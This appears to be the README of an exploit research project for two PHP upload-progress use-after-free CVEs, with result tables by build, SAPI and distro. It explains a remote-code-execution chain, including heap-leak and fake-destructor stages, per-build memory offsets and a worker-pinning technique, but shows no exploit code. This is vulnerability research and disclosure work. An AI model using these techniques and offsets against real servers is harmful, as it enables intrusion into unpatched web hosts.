Research code and measured results for two PHP `session.upload_progress`
use-after-free bugs: CVE-2026-109618 (stale session id) and CVE-2026-109619
(stale unserialize context). The only full chain under all default config is
direct Apache prefork mod_php: a target-written `uid` from the exploited PHP
process on the 7.4, 8.0–8.4 builds marked ✅ below, with per-build offsets and
`(ini)` where the official image ships no active INI. FPM Path C is proven on
8.4.26, 8.2.34 and 8.3.35 only with the non-default changes listed. Nothing here
is a universal exploit: every result is build-, SAPI- and configuration-specific,
default nginx and default FPM are tested negative for this chain, and the
remaining cells are in `COVERAGE.md`.

## What is proven

- Direct Apache prefork mod_php: full chain with a target-written `uid` on
7.4.33, 8.0.28/8.0.29/8.0.30, 8.1.34, 8.2.34, 8.3.35 and 8.4.1–8.4.26, with
`(ini)` where the official image ships none. The 8.2.34/8.3.35 proofs use the
recovered Oct-24 bodies, the 149-holder pin and a fresh stock image (2/2 each).
- Path C on 8.4.26 mod_php: target-written PHP file executed over HTTP, only
with the non-default changes listed in the Path C table.
- Path C on FPM: 8.4.26, 8.2.34 and 8.3.35, only with every non-default change
listed in the Path C table.
- Distro positives: Debian 13 `8.4.24-1~deb13u1` and Ubuntu 25.04
`8.4.5-1ubuntu1.2`, both mod_php. No distro 8.4.26 package is a positive.
- WordPress 7.1.3 on mod_php: 8.0.28 (Sury on Ubuntu 22.04), 8.4.24 (Debian
13.7) and 8.4.26 (official, `(ini)`); the endpoint is the core silence file
and WordPress is not bootstrapped.
- Not proven: 8.5.11 mod_php code execution (leak only), the stale-session chain
on default FPM, any default nginx front, an 8.4.27 or 8.5.12 bypass, Windows
and BSD. 8.5.11 FPM is leak only under the default pool, the single-worker
non-default cell is not a completed RCE, and 8.5.10 Path C is inconclusive.

## How the chain works

PHP starts a session before normal request startup (`RINIT`) when
`session.upload_progress` is on, so it can record upload state early. Both CVEs
come from that early work being interrupted: PHP leaves state behind, and the
next request on the same worker can use it. The state is per process. If the
worker exits, the state is gone.

**CVE-2026-109618: a stale session object.** The first request is a chunked
multipart POST. PHP uses memory while parsing the parts and resetting the
session. If it reaches `memory_limit` in `php_session_reset_id` at request end,
the request dies. Under mod_php the Apache child keeps running. The session id
string (`PS(id)`) is left in a freed chunk that stays in the allocator cache.
The next request on that child can get the same chunk and read the old bytes.

**CVE-2026-109619: stale decoder state.** A normal request starts a session and
unserializes a session record. If that decode reaches `memory_limit`, PHP bails
out before `php_var_unserialize_destroy()`. The process-global `BG(unserialize)`
stays at `level=1` with pointers into the freed request chunk. The next
request's upload-progress decode runs before `RINIT` and reuses that context.
Two `var_push()` stores with an attacker-controlled index overwrite
`ps_files.last_key` and `ps_files.basedir`. The session writer then opens a path
the attacker chose. If that path is a `.php` file under an executing docroot,
the next HTTP request runs it.

**The four requests.** The tool and older notes call them A1, B1, A2 and B2. The
tables call them priming, leak, second priming and write.

| Stage | What it does | What it needs |
|---|---|---|
| A1 (priming) | Chunked multipart POST. The OOM at request end leaves the stale `PS(id)`. | The same child as B1. An OOM is expected; it is not success. |
| B1 (leak) | Second chunked POST. The reused session-id buffer is encoded into `Set-Cookie: PHPSESSID=...`, so the cookie carries heap bytes: the Zend memory-manager main chunk and the `libphp` base. | The same child as A1; a cookie large enough to carry the bytes. |
| A2 (second priming) | Plain multipart POST with the build's filler count. A second OOM leaves the per-request session-variable pointer dangling (`PS(http_session_vars)`). | The same child as B2; the build's filler count. |
| B2 (write) | Plain multipart POST with a fake `zend_array` at the leaked address and a spray of fake `zend_reference` objects. The fake destructor calls `zif_system` (or `zif_passthru` where `zif_system` kills the child). | The addresses leaked by B1, the per-build offsets, and a writable proof path. |

A1/B1 are the leak half. A2/B2 are the write half. A1 and B1 must be the same
child; A2 and B2 must be the same child. Some runs pin all four to one child;
the 8.4.10–8.4.26 runs used a fresh child for A2/B2. The 8.4.26 WordPress run
also worked with A1/B1 on one child and A2/B2 on a fresh child.

**Why mod_php and FPM differ.** mod_php catches the startup bailout in
`sapi/apache2handler/sapi_apache2.c`, runs the request destructor, and keeps the
child and its `ps_globals` at the same address. FPM treats a failed
`php_request_startup()` as fatal: it calls `fcgi_finish_request()`, then
`php_module_shutdown()`, then returns `FPM_EXIT_SOFTWARE` (70) in
`sapi/fpm/fpm/fpm_main.c:1852-1857`. The worker and its `ps_globals` are gone
before a second request exists. That is why no FPM row completes the
stale-session chain. The bug is the same; the failure handling is different.

**Path C is the other route.** Path C does not use a stale session id. It uses
the CVE-2026-109619 decoder state above. The priming request is an app request
that calls `session_start()` after `RINIT`; the consumer is the next request on
the same worker, and its pre-`RINIT` upload-progress decode consumes the stale
context. That is why Path C works on FPM even though A1/B1 does not: it never
needs the worker to survive a failed startup. It still needs one worker or pool
affinity, because the state is per process, and it needs the non-default changes
listed in its table: a lower `memory_limit`, a writable and executable docroot,
`cleanup=Off` in the 8.4.26 FPM cell, and a raised `max_input_vars` or body cap
where the row says so.

**What a target-written `uid` proves.** The proof file is written by the
exploited PHP process and contains the uid of the account the worker runs as
(`uid=33(www-data)`) plus a marker. The harness does not write it. The child may
die with SIGSEGV after writing, and the client may see status 0. That proves
code ran in the target worker under the target account, on that build and
configuration. It does not prove a 200 response, a surviving worker, a WordPress
bootstrap, privilege escalation beyond the web user, or a default-config result.
An HTTP 200/500, an OOM or a crash is never counted as RCE.

**What the chain does not do.** No LFI and no third-party write: the only writes
are the same-chain proof file or the session file. No authentication bypass. No
cross-worker transfer: the state dies with the process. No default nginx or
default FPM result.

## Conventions

| Mark | Meaning |
|---|---|
| ✅ | RCE in that exact cell |
| ❌ | tested negative in that exact cell |
| 🚫 | patched build; basis stated in the row |
| — | no qualifying RCE in that cell (untested, or an engine-level primitive without execution) |

✅ is direct Apache prefork mod_php unless the row names another SAPI.
Non-default cells carry their required changes in parentheses. Endpoints are a
small PHP probe or the named core silence file.

- `all default config`: the production INI of the build (the package conffile, or
`(ini)` when the official image ships none), default package config, default
pool sizing, no site or `.user.ini` override.
- `(ini)`: marks a `php.ini-production` mount because the official image ships
no active INI; it is used for the official-image lab chains that need it.
- `leak only`: the stale session id is recovered into a `Set-Cookie`, but nothing
executes: no write stage, no `uid`.
- `same child`: the named stages must be served by one worker process; the stale
state is per process and dies with it.
- `offsets per build`: `S` (the Zend memory-manager main chunk), `zif_system` and
`zval_ptr_dtor` are measured per build and never transplanted.
- `fillers`: the multipart part count used to shape the heap in the priming and
write stages; build-specific.
- `PS(id)`: the session id string (`php_ps_globals.id`) that the leak stage
re-encodes into the cookie.
- `zif_system`: the PHP internal `system()` handler used as the fake destructor
target; `zif_passthru` where `zif_system` crashes the worker.
- 149-holder pin: 149 held slow requests fill the default pool and pin the last
child. It assumes `MaxRequestWorkers=150` and one free child; it is a
pool-exhaustion primitive, not a config change.

## Results

### mod_php

Official `php:<v>-apache` images, with a `php.ini-production` mount where the
row marks `(ini)`, ASLR on, `display_errors` off, exact per-build offsets and
default prefork sizing, except the 8.0.28 row, which is the exact Sury package.
The mount is the only INI used for 8.0.29 and 8.0.30.

| PHP build | Branch | Status | Result / qualifier |
|---|---|---|---|
| 5.6.40 | 5.6 | ❌ | no RCE; last 5.6 |
| 7.0.33 | 7.0 | ❌ | no RCE; last 7.0 |
| 7.1.33 | 7.1 | ❌ | no RCE; last 7.1 |
| 7.2.0 | 7.2 | ❌ | no RCE; early 7.2 |
| 7.2.34 | 7.2 | ❌ | no RCE; last 7.2 |
| 7.3.33 | 7.3 | ❌ | no RCE; last 7.3 |
| 7.4.0 | 7.4 | ❌ | no RCE; early 7.4 |
| 7.4.32 | 7.4 | ❌ | no RCE on the stale-session-id route; the stale `PS(id)` is rejected (`The session id is too long or contains illegal characters`); no leak, no write; Path C not carried to a proof on this build |
| 7.4.33 | 7.4 | ✅ | full chain on the default 150-worker prefork with the 149-held-request pin; the priming OOM in `php_session_reset_id` leaves a stale `PS(id)` in a cached chunk; target-written `uid`; last 7.4; `S=main+0xfd398`, `zif_system=libphp+0x335850`; (ini; 5/150 prefork) |
| 8.0.28 | 8.0 | ✅ | exact Sury `1:8.0.28-1+ubuntu22.04.1+deb.sury.org+1` with WordPress 7.1.3, all default config: full chain, target-written `uid=33(www-data)`, worker survives; default 150-worker prefork pinned with 149 held slow requests; one child serves every stage; `S=main+0xF7398`, `zif_passthru=libphp+0x1F5640` |
| 8.0.29 | 8.0 | ✅ | full chain on the default 150-worker prefork; the priming OOM in `php_session_reset_id` leaves the stale `PS(id)` and the leak stage recovers `libphp` and `main` from the cookie; target-written `uid`; `zif_system=libphp+0x348eb0`, `zval_ptr_dtor=0x431080` |
| 8.0.30 | 8.0 | ✅ | full chain on the default 150-worker prefork; the same body set as 8.0.29 with this build's offsets; target-written `uid`; last 8.0; `zif_system=libphp+0x3495d0`, `zval_ptr_dtor=0x4319a0` |
| 8.1.33 | 8.1 | ❌ | no RCE; pre-8.1.34; structurally blocked: the second request faults before the header; no cookie, no leak |
| 8.1.34 | 8.1 | ✅ | full chain on the default 150-worker prefork with the 149-held-request pin; the leak stage recovers `libphp` from the `zval_ptr_dtor` qword and `main` from the second 2 MiB cluster; target-written `uid`; last tested 8.1 mod_php; `S=main+0xf9398`, `zif_system=libphp+0x36f470`; (ini; 5/150 prefork) |
| 8.2.0 | 8.2 | ❌ | no RCE; early 8.2 |
| 8.2.15 | 8.2 | ❌ | no RCE; mid 8.2 |
| 8.2.34 | 8.2 | ✅ | recovered Oct-24 bodies; 2/2 target-written `uid=33(www-data)` on a fresh stock `php:8.2.34-apache`; 149-holder pin, same child, no restart or gdb; A1 500/211 B, B1 200/1,383,427 B (decoded 1,169,032, `n=584`, 44 main hits), A2 500/211 B, B2 0 B + SIGSEGV; `S=main+0xF9398`, `zif_system=libphp+0x39b8a0`, `zval_ptr_dtor=libphp+0x487650`; (ini); `receipts/php-8.2.34/` |
| 8.2.35 | 8.2 | 🚫 | fixed control; priming request returns 200 with no OOM |
| 8.3.0 | 8.3 | ❌ | no RCE; early 8.3 |
| 8.3.10 | 8.3 | ❌ | no RCE; mid 8.3 |
| 8.3.20 | 8.3 | ❌ | no RCE; mid 8.3 |
| 8.3.35 | 8.3 | ✅ | recovered Oct-24 bodies and the recorded 8.3.35 calibration; 2/2 target-written `uid=33(www-data)` on a fresh stock `php:8.3.35-apache`; 149-holder pin, same child, no restart or gdb; A1 500/211 B, B1 200/1,380,063 B (decoded 1,169,032, `n=584`, 44 main hits), A2 500/211 B, B2 0 B + SIGSEGV; `S=main+0xF9398`, `zif_system=libphp+0x3AC080`, `zval_ptr_dtor=libphp+0x49EC50`; (ini); `receipts/php-8.3.35/` |
| 8.3.36 | 8.3 | 🚫 | fixed control; priming request returns 200 with no OOM |
| 8.4.0 | 8.4 | — | never released upstream; no official image or release |
| 8.4.1–8.4.7 | 8.4 | ✅ | per-build tested, not a range extrapolation; 21/21 target-written full-chain proofs (3 per build); direct mod_php chain on a 22-byte `/index.php` stub; 8.4.1 WordPress `/wp-content/index.php` endpoint control; Apache 2.4.62, not 2.4.69; target-written `uid`; `S=main+0xED398`; 8.4.7 pure-HTTP 149 half-open pin (no local process control, no fresh-child swap; `%P` added only for PID attribution in the rerun); (ini); `receipts/php-8.4.1/` … `receipts/php-8.4.7/` |
| 8.4.8 | 8.4 | ✅ | pure-HTTP and direct Apache both reproduced; WordPress `/wp-content/index.php` core file, target-written `uid`; `S=main+0xE8398`; engine-level |
| 8.4.9 | 8.4 | — | never released upstream; 8.4.8 to 8.4.10 |
| 8.4.10–8.4.26 | 8.4 | ✅ | per-build tested, not a single-build extrapolation; 17 copied target-written `uid` proofs (one per build; not re-executed); `S=main+0xF8398`; 8.4.26 endpoint-independent; the copied 8.4.26 WordPress proof from the run on pristine WordPress 7.1.3 with the default 150-worker pool (not re-executed): priming and leak on one pinned child, write stage on a fresh child, target-written `uid`, all default config; (ini); `receipts/php-8.4.10/` … `receipts/php-8.4.26/` |
| 8.4.27 | 8.4 | 🚫 | fixed in source; runtime control returns 200 with no leak |
| 8.5.0 | 8.5 | ❌ | leak only; no libphp code pointer |
| 8.5.5 | 8.5 | ❌ | leak only |
| 8.5.10 | 8.5 | ❌ | leak only; no `libphp`/`main` pointer; known offsets `zif_system 0x598d60`, `zval_ptr_dtor 0x7b3860`, `ps_globals 0x1770a40`; no code execution |
| 8.5.11 | 8.5 | ❌ | leak only; no `uid` and no target-written proof; the Set-Cookie channel is closed with a file part (`send_cookie=0`, no `libphp`/`main` pointer reaches the wire); known offsets `zif_system 0x5996e0`, `zval_ptr_dtor 0x7b47a0`, `std_object_handlers 0x169cf60`, `zend_standard_class_def 0x178e9b0`, `php_session_initialize 0x5469d0`; A2/B2 not reached |
| 8.5.12 | 8.5 | 🚫 | fixed in source; runtime control returns 200 with a normal cookie |

`(ini)` sets `output_buffering=4096`, `display_errors=Off`, `log_errors=On`,
`memory_limit=128M`, `post_max_size=8M`, `session.upload_progress.enabled=On`,
`session.sid_length=26` and `session.sid_bits_per_character=5`. The 7.4.33 and
8.1.34 cells fail at priming with no active INI; on 8.1.34 a minimal-INI control
isolates `output_buffering=4096`. The 8.4.26 no-active-INI control with explicit
settings (`output_buffering=0`, `display_errors=On`, `log_errors=Off`) returns
200 at priming with the session destroyed, so no stale `PS(id)` exists and the
chain is unreachable.

The 7.4.33 and 8.1.34 cells use the default 150-worker prefork; a single-worker
container was an additional control only and is not part of either cell. The
149-holder pin assumes `MaxRequestWorkers=150` and one free child.

### FPM

Official `php:<v>-fpm` images behind nginx, with `(ini)` mounted (the image
ships none), `pm=dynamic` with the default child cap. This table covers the
stale-session-id chain; Path C is separate. Rows naming a different build or
pool override the generic wording.

| PHP build | Branch | Status | Result / qualifier |
|---|---|---|---|
| 5.6.40 | 5.6 | ❌ | priming OOM/SIGSEGV; no leak, no write stage |
| 7.0.33 | 7.0 | ❌ | leak only |
| 7.1.33 | 7.1 | ❌ | leak only |
| 7.2.34 | 7.2 | ❌ | leak only |
| 7.3.33 | 7.3 | ❌ | leak only |
| 7.4.33 | 7.4 | ❌ | leak only |
| 8.0.29 | 8.0 | ❌ | default nginx cap rejects the priming body; direct FPM runs the priming OOM, the worker exits 70, and no state carries over |
| 8.0.30 | 8.0 | ❌ | second stage 200 under the default limit; the first stage also returns 200 with a lowered limit, no OOM; the 8.0-geometry priming OOM instead exits the worker 70 |
| 8.1.34 | 8.1 | ❌ | priming request ends in a worker exit; no state carry-over |
| 8.2.34 | 8.2 | ❌ | priming request ends in a worker exit; the mod_php stale-id result does not extend to FPM (Path C does, with non-default settings) |
| 8.2.35 | 8.2 | 🚫 | fixed control; priming requests return 200, no worker exits |
| 8.3.35 | 8.3 | ❌ | structurally blocked, direct FPM and default nginx; see below |
| 8.3.36 | 8.3 | 🚫 | fixed control; priming request returns 200 |
| 8.4.26 | 8.4 | ❌ | chain negative: a sub-cap priming body still OOMs and the worker exits; the leak body is rejected at the default body cap; no surviving child or leak; the 109619 primitive is present but no controlled destructor |
| 8.4.27 | 8.4 | 🚫 | source-level fix; FPM runtime control not run |
| 8.5.11 (non-default: `pm=static`, one worker) | 8.5 | — | plain full-extension build, `pm=static`, one worker, same-worker known target plus trigger script; an earlier single-worker shape used blind leak-derived addresses and a fake destructor to `zif_system`; no target-written proof, so not a completed RCE |
| 8.5.11 (default `pm=dynamic` pool) | 8.5 | ❌ | leak only |
| 8.5.12 | 8.5 | 🚫 | fixed; plain full-extension build with default nginx |

FPM 5.6.40 produced no leak; the leak-only range is 7.0.33–7.4.33. Large-body
7.4/8.0 FPM leak negatives are invalid: `post_max_size` rejects the body before
session code.

**8.3.35 FPM is structurally blocked.** Canonical and shrunk priming shapes each
OOM at startup and the worker exits, so no process survives to serve the leak
stage with a stale `PS(id)`; the Apache holder pattern cannot help because the
holder would have to survive its own fatal. FastCGI has no chunked escape,
`S_off` is not calibrated on FPM, and the default nginx cap and
`fastcgi_buffer_size` reject the bodies and the oversized response header. No
proof file, no RCE.

### Path C (CVE-2026-109619)

Path C uses CVE-2026-109619 only (see How the chain works): the priming page
calls `session_start()` after `RINIT`, and the next request on the same worker
consumes the stale decoder context. It needs one worker or pool affinity, and
every non-default change listed in the row is required. No Path C artifact is
preserved under `receipts/`: the rows below record lab results and are not
receipt-backed.

| Build / SAPI | Status | Required non-default changes | Result |
|---|---|---|---|
| 8.4.26 mod_php | ✅ | reduced `memory_limit`, single worker (`MaxRequestWorkers 1`), writable docroot, pre-seeded prime session, an extra shaping part | target-written PHP file executed over HTTP; the child survives; the same payload is blocked on 8.4.27 (no file, probe 404) |
| 8.4.26 FPM | ✅ | `session.upload_progress.cleanup=Off`, reduced `memory_limit`, raised `max_input_vars`, writable executable docroot, single worker or pool affinity, pre-seeded session, raised `client_max_body_size` (non-default body cap; the nginx location/routing stays default) | target-written shell executed through the default nginx PHP location and routing; the body cap is the non-default change, not a default-cap bypass; later runs on the same worker also succeed |
| 8.2.34 FPM | ✅ | reduced `memory_limit`, pre-seeded two-record session, priming page that calls `session_start()` after RINIT, one worker with no intervening request, writable executable docroot | target-written shell executed; same worker serves prime, consumer and shell request |
| 8.3.35 FPM | ✅ | same as 8.2.34 | target-written shell executed, including in a subdirectory of the docroot |
| 8.2.35 FPM | 🚫 | none | early reset plus fallible unserialize; no shell, session file unchanged |
| 8.3.36 FPM | 🚫 | none | same fix; no shell, worker alive |
| 8.4.27 FPM | 🚫 | none | source-level fix only; no FPM binary executed |
| 8.5.12 FPM | 🚫 | none | runtime control: the pre-RINIT decode sees a zeroed context; no shell |
| 8.5.10 FPM | — | n/a | inconclusive; neither fixed nor exploitable is claimed |
| 7.4.32 mod_php | — | not completed | the local shape needs an absolute chunk base and a pre-seeded two-record session; not counted as RCE here |
| 7.4.32 FPM | — | source only | same preconditions by inspection; no runnable 7.4.32 FPM build |
| Default nginx front | ❌ | larger `client_max_body_size` (non-default) | the default cap returns 413 before PHP for the priming and consumer bodies |

Notes on Path C:

- Default `max_multipart_body_parts=-1` resolves to `max_input_vars + max_file_uploads`; raising `max_input_vars` covers the part budget. Other session settings were not required in the measured 8.4.26 shape.
- A writable, executable docroot is required: a read-only docroot reaches the session writer but the open fails. No direct command-execution variant was demonstrated.
- Unpinned requests land on different workers and fail; holding all but one pins the chain. There is no cross-worker state transfer.
- Upload-progress keys cannot inject arbitrary serialized records (`|` is rejected by the `php` serializer), so attacker-controlled session content remains the limitation; no default-application drive-by is claimed.
- Fixed builds zero the serialize state in `php_basic_early_rinit()` before `sapi_activate()` and the fallible unserializer unwinds. Offsets are build-, INI- and request-shape-specific; 7.4.32 additionally needs the chunk base.

### nginx + mod_php

nginx terminates HTTP and proxies to Apache prefork mod_php.

| Build / package | Status | Conditions / result |
|---|---|---|
| 8.4.7 official | ❌ | default nginx body cap rejects both stages; `proxy_request_buffering on` destroys the holder pin (measured on the same 8.4.8 stack); direct Apache chain reproduced |
| 8.4.8 official | ❌ | default cap rejects both stages; holders never reach Apache and Apache sees fewer POSTs; the default response-header buffer returns 502 on the oversized leak header; a size-cap-only control returns a normal response with no session cookie; direct Apache chain reproduced |
| 8.4.24 Debian 13 (`8.4.24-1~deb13u1`) | — | the default nginx cell is not a positive: the leak body would be rejected and buffering re-arms `post_max_size`; the earlier non-default cell is not a default result; the verified path is direct Apache |
| 8.4.26 official | ❌ | default nginx negative: priming and leak bodies rejected; every holder logged with `up="-"`; the probe requests ran on distinct children; the response header exceeds the default `proxy_buffer_size`; no default bypass |
| 8.4.26 official | — | non-default only (larger `client_max_body_size`, larger response-header buffers, upstream keepalive); not a default result or default-bypass claim |
| 8.4.27 | 🚫 | fixed; priming and leak probes return 200 with no leak, default and non-default |

The direct Apache 8.4.7/8.4.8/8.4.26 cells are ✅; the ❌ rows are
nginx-terminated cells only. With `proxy_request_buffering on`, every half-open
holder is logged `up="-"`, so no holder reaches Apache and probes run on distinct
children; a body-cap sweep found no functional priming body. The only same-child
route without holders is a non-default request-side relaxation
(`proxy_http_version 1.1`, cleared `Connection`, upstream keepalive); a residual
paginated small leak is untested.

### nginx + FPM

Default nginx front, default FPM pool.

| PHP build | Status | Conditions / result |
|---|---|---|
| 8.0.29 | ❌ | default cap returns 413 for the priming body; with a raised cap the startup OOM exits the worker 70 and the next request lands on a fresh worker |
| 8.0.30 | ❌ | second stage 200; the first stage also 200 with a lowered limit, no OOM |
| 8.1.34 | ❌ | priming request ends in a worker exit; no state carry-over |
| 8.2.34 | ❌ | same worker-exit shape |
| 8.2.35 | 🚫 | fixed control; priming requests return 200, no worker exits |
| 8.3.35 | ❌ | canonical bodies rejected at the default cap; the shrunk priming body returns 502 with a FastCGI stderr record from the dying worker; startup OOM exits the worker; the default `fastcgi_buffer_size` rejects the oversized response header; no chain |
| 8.3.36 | 🚫 | fixed; priming request returns 200 |
| 8.4.26 | ❌ | default cap returns 413; with a raised cap the worker still exits on OOM, so the cap is not the only blocker; the amplification path is insufficient to replace the leak body; no chain |
| 8.4.27 | 🚫 | upstream fix; runtime control missing |
| 8.5.11 | ❌ | leak only under the default `pm=dynamic` pool; the single-worker non-default cell is not a completed RCE (FPM table) |
| 8.5.12 | 🚫 | plain full-extension build with default nginx; priming request returns 200 |

Request amplification does not replace the leak stage; see Reading the negative
results.

### OpenLiteSpeed + lsphp (LSAPI)

OpenLiteSpeed 1.9.3 Open, close to default config, PHP's default limits and a
small PHP probe endpoint. `lsphp` is a standalone LSAPI executable, not a shared
module.

| PHP build | LSAPI | Status | Result / qualifier | Basis |
|---|---|---|---|---|
| 8.4.26 (local source build) | V8.3 | ❌ | probes return 200 normally; an instrumented build reproduces the poisoned `$_FILES` bucket and then OOMs; the untouched binary returns 500 with a normal `WIFEXITED` status and no SIGSEGV/SIGABRT/SIGBUS, and the server respawns the worker while health stays 200; alternate carrier shapes also OOM and exit; no RCE | runtime |
| 8.4.27 (`lsphp84 8.4.27-1+trixie`) | V8.3 | 🚫 | fixed control: every probe returns 200, no request-time worker exits or signals, no OOM | runtime |
| 8.5.11 | V8.3 (upstream) | — | no exact local `lsphp` build; upstream `sapi/litespeed/lsapi_main.c` has the same early return, so the expected shape is the same 500/exit, but it was not measured; untested, not a negative | source only |

**Why LSAPI does not reach the destructor.** `lsapi_module_main()` returns `-1`
when `php_request_startup()` fails, so only `php_module_shutdown()` runs and
`main()` returns `-1` (exit 255); `php_request_shutdown()`, where `$_FILES` is
destroyed, is skipped and the poisoned bucket is never destructed. Exit 255 is a
normal failure return, not a crash signal; the server respawns the worker. No
code execution. LSAPI runs its own master/worker tree, so mod_php libphp
addresses and handlers do not apply.

### Distro packages

Tested or package-evidenced rows only, exact package strings.

| Distro / release | Exact package | SAPI | Status | Result / qualifier |
|---|---|---|---|---|
| Debian 13 (trixie) | `8.4.24-1~deb13u1` | mod_php | ✅ | default package, direct Apache mod_php: pure-HTTP 149 half-open pin full chains plus a leak-only run, target-written `uid=33(www-data)` on the first write attempt, no `%P`/`/proc`/gdb/local process control; prior multi-worker audit with target-written proofs (blind and pooled series; the pooled series used a worker-count observation); full chain on a cell with no site, config or INI override; package constants `S=main+0xF7398`, `zif_system=0x24cdd0`, `zval_ptr_dtor=0x424ff0`, `PS(id)=ps_globals+0x10`; default nginx blocked |
| Debian 13.7 (trixie) | `8.4.27-1~deb13u1` | mod_php + FPM | 🚫 | changelog names CVE-2026-109618/109619; mod_php priming request 200 with no leak; FPM leak body rejected by the default `post_max_size` (not a valid negative) |
| Debian 12 (bookworm) | `8.2.35-1~deb12u1` | mod_php + FPM | 🚫 | fixed control; priming requests 200, no FPM worker exits; package revision includes the fix |
| Debian 12 (bookworm) | `8.2.32-1~deb12u1` | mod_php + FPM | ❌ | priming parse-OOM 500, second stage 500, FPM workers exit; no leak; crash/DoS only; leak-stage blocker |
| Debian 11.11 (bullseye) | `7.4.33-1+deb11u12` | mod_php + FPM | ❌ | no leak primitive on mod_php; the changelog has no fix entry and the build is not claimed fixed; mod_php priming and second stage return 200; pinned single child no leak; FPM leak body rejected by the default `post_max_size`; 7.4 multipart part cap |
| Ubuntu 25.04 (plucky) | `8.4.5-1ubuntu1.2` | mod_php | ✅ | package-specific; full chain on the WordPress core file; symbol offsets `0x245810`/`0x424fc0`; `fillers=116`; `S=main+0xF7398`; upstream 8.4.5 is inside the verified 8.4.1–8.4.7 range |
| Ubuntu 22.04 LTS | `8.1.2-1ubuntu2.28` | mod_php + FPM | 🚫 | fixed control; priming request 200 with no cookie, second stage 200, no FPM worker exits; package revision carries the branch fix |
| Ubuntu 22.04 LTS | `8.1.2-1ubuntu2` | mod_php + FPM | ❌ | priming parse-OOM 500, second stage 500, FPM workers exit; no leak; crash/DoS only; leak-stage blocker |
| Ubuntu 24.04 LTS | `8.3.6-0maysync1` (release `8.3.6`, pre-update) | mod_php + FPM | ❌ | 109618 Content-Length body: mod_php SIGSEGV from the priming OOM; Apache+FPM returns an empty 200 with a worker exit, no SIGSEGV, next GET 200; no RCE/OOB; crash/DoS only |
| Ubuntu 24.04 LTS | `8.3.6-0ubuntu0.24.04.13` | mod_php + FPM | 🚫 | fixed control; an over-limit chunked body returns 200 `OK` with the length-mismatch warning and no OOM; priming request 200, no FPM worker exits; the fixed write stage was not run |
| Ubuntu 26.04 LTS | `8.5.4-0ubuntu1` (release) | mod_php + FPM | ❌ | same crash/DoS shape as 24.04; a heap leak appears once with no `libphp`/`S` anchor; no ASLR break; no RCE/OOB |
| Ubuntu 26.04 LTS | `8.5.4-0ubuntu1.5` | mod_php + FPM | 🚫 | fixed control; over-limit chunked body returns 200 `OK` with the warning and no OOM; priming request 200, no FPM worker exits |
| Alpine 3.20.10 | `8.3.15-r0` | mod_php (apache2) | ❌ | crash only; priming request 200; a large-part body returns 500 OOM on the pinned single child; no leak, normal cookies; second stage 500 OOM; 8.3 parse-phase OOM only |
| Alpine 3.21.9 | `8.4.27-r0` | mod_php (apache2) | 🚫 | fixed by version; priming and second stage 200, no leak |
| Arch Linux rolling | `8.5.12-1`; `php-legacy 8.3.36-1` | mod_php | 🚫 | fixed metadata only: repos ship 8.5.12/8.3.36 and no 8.4.26; no local image or rootfs, so not package-tested; no Arch package chain |
| `php:8.4.26-apache` + Arch INI (not a package) | Arch `php.ini` on the official image | mod_php | ✅ | INI-compatibility test, not an Arch package result and not an Arch RCE; already counted in the mod_php table |
| Rocky Linux 9.3 | `8.0.30-8.el9_8.1` | FPM only | ❌ | no mod_php; the leak body is rejected by the default `post_max_size` (invalid negative); priming and second stage 200; multipart part cap |
| AlmaLinux 9.8 | `php-fpm 8.0.30-8.el9_8.1` | FPM only | 🚫 | same package and byte-identical `php.ini` as Rocky 9; no mod_php/`libphp`; priming and second stage 200; leak body blocked by the default `post_max_size` (invalid negative); the 109618 header flood does not grow the Zend heap under FPM, so the first stage is unreachable at default limits; the changelog names both CVEs (Red Hat backport) |
| Amazon Linux 2023.12 | `php8.4-modphp 8.4.26-1.amzn2023.0.1` | mod_php + FPM | ❌ | pre-fix row; 8.4.26 installable only when `modphp`, `fpm` and `common` are pinned together; the default SAPI is FPM (MPM `event`; `libphp.so` loads only under prefork), mod_php measured with a declared prefork fixture; the priming OOM is reproduced at a shifted geometry; no leak on the default or pinned single-child pool, all cookies normal; 109618 reaches the first stage and the second stage was not observed over the sweep; no write stage |
| Amazon Linux 2023.12 | `php8.4-modphp 8.4.27-1.amzn2023.0.1` | mod_php + FPM | 🚫 | fixed control on the same package line and INI; priming and 109618 header-flood requests return 200 with no OOM; FPM second stage 200; behaviorally fixed, the Amazon changelog is version-only |
| Fedora 44 | `php-fpm 8.5.12-1.fc44` | FPM only | 🚫 | no mod_php package or Apache DSO (`php-embedded` `libphp.so` has no `apache2handler`); priming requests 200 with a normal cookie; the leak body is blocked by the default `post_max_size`; 8.5.12 is fixed by version; 109618 not run |

**Default distro PHP 8.4.26 is not supported.** No default repository ships
8.4.26 with prefork mod_php; Oracle and Rocky 8/9/10 ship other 8.2/8.3/8.4
builds, mostly FPM-only, and FreeBSD defaults to 8.4.27/8.5.12. No tested distro
8.4.26 package gave a full-chain RCE on the upstream geometry. The only proven
distro full-chain positives are Debian 13 `8.4.24-1~deb13u1` and Ubuntu 25.04
`8.4.5-1ubuntu1.2`. A custom source build of 8.4.26 is a candidate, unverified.

Amazon 8.4.26 is first-stage only, with no leak on the default or a pinned
single-child pool, so no write stage. Fedora 44 8.5.12 is fixed by version, and
the Alma/Rocky EL9 package carries the Red Hat backport. A same-run official
8.4.26 control (ini) reproduced the full chain.

### WordPress 7.1.3 + Apache prefork mod_php

Direct-Apache cells on a real WordPress 7.1.3 tree: Debian 13.7 Apache 2.4.69
prefork mod_php 8.4.24 (earlier audit plus the pure-HTTP pin), Sury PHP 8.0.28 on
Ubuntu 22.04 Apache 2.4.52 prefork, and official `php:8.4.26-apache` (ini). All
use the core silence file, write the proof as the Apache user, and do not extend
to nginx or FPM.

Sury 8.0.28 runs on Ubuntu 22.04 with
`libapache2-mod-php8.0 1:8.0.28-1+ubuntu22.04.1+deb.sury.org+1` and
`apache2 2.4.52-1ubuntu4.25`; the package `php.ini` is unchanged
(`display_errors=Off`, upload progress on with cleanup,
`session.use_strict_mode=0`), ASLR is on, and the pool is the default 150-worker
prefork. Held connections pin one child, which serves the whole chain and writes
the proof; `zif_passthru` is used because `zif_system` crashes the worker in
`php_exec`. The endpoint is `/wp-content/index.php`; no plugin was added, core
has no executable `session_start()`, and the pre-script upload-progress handler
starts the session. The docroot is read-only; the harness adds only a holder
script and a writable proof path.

Official `php:8.4.26-apache` (ini) with pristine WordPress 7.1.3, Apache 2.4.69
prefork and the default 150-worker pool: parked header-only connections leave one
free child; priming and leak run on the same child, then second priming and write
run on a fresh child that crashes after writing the proof. The write stage calls
`zif_system`. The same sequence reproduced on a plain PHP file under the same
docroot, so the endpoint is not the differentiator; default nginx rejects the
leak body.

| Condition | Audited value |
|---|---|
